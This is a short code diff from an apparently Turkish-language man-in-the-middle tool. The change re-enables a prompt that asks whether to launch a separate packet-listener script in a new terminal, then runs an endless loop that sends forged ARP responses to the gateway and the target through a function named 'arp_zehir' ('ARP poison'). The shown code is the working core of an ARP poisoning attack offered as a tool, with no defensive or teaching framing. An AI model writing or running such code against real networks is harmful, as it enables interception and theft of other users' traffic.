@@ -51,11 +51,11 @@ def arp_zehir(gatewayip,targetip):
 	scapy.send(arpresponse,verbose=False)
 number=0
 try:
-	#cevap=input("Listen the package[Y/n]")
-	#if (cevap == "n" or cevap == "N"):
-	#	pass
-	#else:
-	subprocess.Popen(["xfce4-terminal", "-e", "python /root/Desktop/mMitm/packet_listener.py"], stdout=subprocess.PIPE)
+	cevap=input("Listen the package[Y/n]")
+	if (cevap == "n" or cevap == "N"):
+		pass
+	else:
+		subprocess.Popen(["xfce4-terminal", "-e", "python /root/Desktop/mMitm/packet_listener.py"], stdout=subprocess.PIPE)
 	while True:
 		arp_zehir(gatewayip,targetip)
 		arp_zehir(targetip,gatewayip)
